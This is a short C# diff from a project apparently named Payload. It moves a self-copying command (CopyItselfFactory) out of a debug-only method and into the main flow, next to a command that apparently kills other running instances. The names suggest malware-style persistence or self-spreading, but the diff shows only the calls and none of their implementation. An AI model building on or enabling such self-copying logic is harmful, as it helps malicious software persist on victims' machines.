@@ -1,4 +1,4 @@
-﻿using Payload.Common;
+﻿using CommonClassLibrary;
 using Payload.Core.Command;
 using System;
 using System.Collections.Generic;
@@ -51,12 +51,13 @@ namespace Payload
 
         static void OnDebug()
         {
-            new CopyItselfFactory().CreateCommand().Execute();
+            
         }
 
         static void MainFlow()
         {
             new KillOtherMeFactory().CreateCommand().Execute();
+            new CopyItselfFactory().CreateCommand().Execute();
 #if DEBUG
             OnDebug();
 #else
